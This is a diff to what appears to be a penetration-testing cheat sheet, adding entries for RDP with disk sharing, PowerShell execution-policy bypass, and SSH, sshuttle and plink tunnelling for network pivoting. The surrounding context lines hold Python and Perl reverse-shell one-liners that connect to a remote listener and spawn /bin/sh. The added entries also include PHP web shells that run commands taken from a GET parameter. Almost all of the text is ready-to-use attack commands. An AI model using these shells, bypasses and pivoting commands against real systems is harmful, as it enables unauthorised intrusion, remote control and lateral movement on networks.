@@ -93,6 +93,42 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 perl -e 'use Socket;$i="target";$p=4443;socket(S,PF_INET,SOCK_STREAM,getproto byname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN ,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 
+    Remote Desktop
+Remote Desktop for windows with share and 85% screen
+rdesktop -u username -p password -g 85% -r disk:share=/root/ target
+
+    PHP
+PHP command injection from GET Request
+<?php echo system($_GET["cmd"]);?> 
+#Alternative
+<?php echo shell_exec($_GET["cmd"]);?>
+
+
+    Powershell
+Non-interactive execute powershell file
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive - NoProfile -File file.ps1
+
+
+## SSH Tunneling / Pivoting
+shuttle
+sshuttle -vvr user@target 10.1.1.0/24
+
+    Local port forwarding
+ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
+    
+    
+    Remote port forwarding
+ssh <gateway> -R <remote port to bind>:<local host>:<local port>
+    
+    
+    Dynamic port forwarding
+ssh -D <local proxy port> -p <remote port> <target>
+    
+    
+    Plink local port forwarding
+plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>
+
+
 # WEB
 
 >> see all links for faster enum of site content (linkgopher)
